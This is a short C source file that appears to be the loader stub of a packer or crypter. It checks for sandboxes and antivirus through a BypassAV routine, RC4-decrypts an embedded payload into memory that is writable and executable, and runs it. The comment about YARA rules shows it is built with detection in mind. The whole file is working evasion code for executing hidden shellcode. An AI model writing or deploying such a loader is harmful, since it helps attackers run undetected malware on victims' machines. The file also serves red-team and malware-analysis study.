#include <windows.h>
#include "AntiSandbox.h"
#include "payload.h"
#include "key.h"
#include "RC4.h"

const char LABEL[] = {"<Amber:27a01d4772038a3f83552908e0470604e773f8af>"}; // Descriptive label for yara rules ;D
void ExecutePayload();


int main(int argc, char const *argv[])
{
	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
	if(BypassAV(NULL)){
		ExecutePayload();
	}
	return 0;
}

void ExecutePayload(){


	unsigned char S[N];
    KSA(Payload_key,Payload_key_len,S);	
	unsigned char* BUFFER = (unsigned char*)VirtualAlloc(NULL, Payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PRGA(S,Payload,Payload_len,BUFFER);
	(*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
}


